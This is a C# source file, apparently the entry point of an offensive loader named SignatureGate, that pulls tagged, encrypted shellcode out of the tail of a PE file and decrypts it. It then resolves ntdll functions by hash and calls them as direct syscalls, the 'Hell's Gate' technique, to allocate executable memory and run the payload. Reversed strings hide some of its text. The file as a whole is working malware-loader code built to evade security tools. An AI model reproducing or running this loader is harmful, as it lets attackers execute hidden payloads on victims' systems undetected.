//start
using System.Text;
using System.Linq;
using System;
﻿
using System.Collections.Generic;
using System.IO;
using SignatureGate.Module;

namespace SignatureGate {

    public class Program {

        public static string _pePath = "";
        public static string _encKey = "";
        public static byte[] _tag = { 0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce };
        static void Main(string[] args) {
            if (args.Length != 2)
            {
                Console.WriteLine(new string(">yeKnoitpyrcne< >elif< exe.elif :egasU".ToCharArray().Reverse().ToArray()));
                return;
            }
            string url = args[0];
            _pePath = args[0];
            _encKey = args[1];
            if (!File.Exists(_pePath)){
                Console.WriteLine(new string("tsixe ton seod eliF".ToCharArray().Reverse().ToArray()));
                return;
            }

            Console.WriteLine("[+]:Loading/Parsing PE File '{0}'", _pePath);
            Console.WriteLine();

            byte[] _peBlob = Util.Read(_pePath);
            int _dataOffset = Util.scanPattern(_peBlob, _tag);

            Console.WriteLine(new string(new string("[+]:Scanning for Shellcode...".ToCharArray().Reverse().ToArray()).ToCharArray().Reverse().ToArray()));
            if (_dataOffset == -1)
            {
                Console.WriteLine(new string(new string("Could not locate data or shellcode".ToCharArray().Reverse().ToArray()).ToCharArray().Reverse().ToArray()));
                Environment.Exit(0);
            }

            Stream stream = new MemoryStream(_peBlob);
            long pos = stream.Seek(_dataOffset + _tag.Length, SeekOrigin.Begin);
            Console.WriteLine("[+]: Shellcode located at {0:x2}", pos);
            byte[] shellcode = new byte[_peBlob.Length - (pos + _tag.Length)];
            stream.Read(shellcode, 0, (_peBlob.Length) - ((int)pos + _tag.Length));
            byte[] _data = Util.Decrypt(shellcode, _encKey);

            stream.Close();

            if (IntPtr.Size != 8) {
                Util.LogError(new string("n\\.txetnoc 46x ni detset ylno tcejorP".ToCharArray().Reverse().ToArray()));
                return;
            }
            
            SystemModule ntdll = new SystemModule(new string("lld.lldtn".ToCharArray().Reverse().ToArray()));
            ntdll.LoadAllStructures();

            Dictionary<UInt64, Util.APITableEntry> APITable = new Dictionary<ulong, Util.APITableEntry>() {
                { Util.NtAllocateVirtualMemoryHash, ntdll.GetAPITableEntry(Util.NtAllocateVirtualMemoryHash) },
                { Util.NtProtectVirtualMemoryHash, ntdll.GetAPITableEntry(Util.NtProtectVirtualMemoryHash) },
                { Util.NtCreateThreadExHash, ntdll.GetAPITableEntry(Util.NtCreateThreadExHash) },
                { Util.NtWaitForSingleObjectHash, ntdll.GetAPITableEntry(Util.NtWaitForSingleObjectHash) }
            };
            ntdll.Dispose();

            Util.LogInfo($"NtAllocateVirtualMemory: 0x{APITable[Util.NtAllocateVirtualMemoryHash].Syscall:x4}");
            Util.LogInfo($"NtProtectVirtualMemory:  0x{APITable[Util.NtProtectVirtualMemoryHash].Syscall:x4}");
            Util.LogInfo($"NtWaitForSingleObject:   0x{APITable[Util.NtWaitForSingleObjectHash].Syscall:x4}");
            Util.LogInfo($"NtCreateThreadEx:        0x{APITable[Util.NtCreateThreadExHash].Syscall:x4}\n");

            HellsGate gate = new HellsGate(APITable);
            gate.GenerateRWXMemorySegment();
            gate.Payload(_data);
            return;
        }
    }
}
